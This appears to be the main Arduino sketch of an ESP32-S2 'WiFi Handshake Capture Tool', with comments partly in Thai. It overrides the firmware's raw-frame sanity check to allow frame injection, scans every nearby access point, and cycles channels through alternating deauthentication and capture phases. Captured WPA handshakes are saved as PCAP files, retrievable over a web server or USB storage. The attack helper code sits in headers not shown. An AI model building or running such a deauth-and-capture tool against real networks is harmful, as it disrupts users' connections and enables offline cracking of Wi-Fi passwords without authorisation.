#include <WiFi.h>
#include <SPIFFS.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <WebServer.h>
#include <DNSServer.h>

// ==================== USB MSC SUPPORT CHECK ====================
#if defined(ARDUINO_USB_MODE) && defined(ARDUINO_USB_MSC_ON_BOOT)
    #define USB_MSC_ENABLED
    #include "USB.h"
    #include "USBMSC.h"
#endif

// ==================== BYPASS FRAME CHECK ====================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg2; (void)arg3;
    return (arg == 31337) ? 1 : 0;
}

// ==================== INCLUDES ====================
#include "config.h"
#include "globals.h"
#include "hardware.h"
#include "pcap_manager.h"
#include "usb_manager.h"
#include "web_interface.h"

// ==================== GLOBAL VARIABLE DEFINITIONS ====================
APInfo apList[MAX_APS];
HandshakeInfo handshakes[MAX_HANDSHAKES];
BeaconTracker beaconTrackers[MAX_BEACON_TRACKERS];
int apCount = 0;
int handshakeCount = 0;
int beaconTrackerCount = 0;
uint32_t packetCount = 0;
uint32_t deauthCount = 0;
uint32_t filteredPacketCount = 0;

uint8_t currentChannel = 1;
uint32_t channelStartTime = 0;
bool isDeauthPhase = true;
bool isCapturing = false;
uint8_t cycleCount = 0;

// Active channels (ช่องที่มี AP)
uint8_t activeChannels[MAX_CHANNELS];
int activeChannelCount = 0;
int activeChannelIndex = 0;

File pcapFile;
bool fileOpen = false;
char currentFilename[32];

// PCAP write buffer
uint8_t pcapWriteBuffer[PCAP_BUFFER_SIZE];
uint16_t pcapBufferPos = 0;

// Web Server Variables
bool webServerMode = false;
bool usbMscMode = false;
uint32_t buttonPressStart = 0;
bool buttonPressed = false;

// ==================== SETUP & LOOP ====================
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("========================================");
    Serial.println("ESP32S2 WiFi Handshake Capture Tool");
    Serial.println("Modular Version with Optimizations");
    Serial.println("========================================");
    
    // 1. เริ่มต้น Hardware
    initLED();
    initButton();
    
    // 2. เริ่มต้น SPIFFS
    initSPIFFS();
    
    // 3. เริ่มต้น WiFi
    initWiFi();
    
    // 4. สแกน AP ทั้งหมด
    deepScanAllAPs();
    
    // 5. เริ่มการดักจับ
    startCapture();
}

void loop() {
    checkButton(); // ตรวจสอบปุ่มในทุกโหมด
    
    if (webServerMode) {
        // Web Server + USB MSC Mode
        dnsServer.processNextRequest();
        server.handleClient();
        // USB MSC ทำงานอัตโนมัติใน background
    } else {
        // Capture Mode
        updateCapture();
        
        // แสดงสถิติทุก 5 วินาที (เฉพาะโหมดดักจับ)
        static uint32_t lastStats = 0;
        if (millis() - lastStats >= 5000) {
            lastStats = millis();
            
            if (isCapturing) {
                // Optimization: นับ handshake ที่สมบูรณ์แค่ครั้งเดียว
                int completeCount = 0;
                for (int i = 0; i < handshakeCount; i++) {
                    if (handshakes[i].complete) completeCount++;
                }
                
                Serial.printf("[STATS] CH%d | Phase:%s | Cycle:%d | HS:%d/%d | PKT:%lu | DEAUTH:%lu | Heap:%d\n",
                             currentChannel,
                             isDeauthPhase ? "DEAUTH" : "CAPTURE",
                             cycleCount + 1,
                             completeCount,
                             handshakeCount,
                             packetCount,
                             deauthCount,
                             ESP.getFreeHeap());
                
                // Optimization: ทำความสะอาด memory เมื่อ heap ต่ำ
                if (ESP.getFreeHeap() < 15000) {
                    optimizeMemory();
                }
            }
        }
    }
    
    delay(10);
}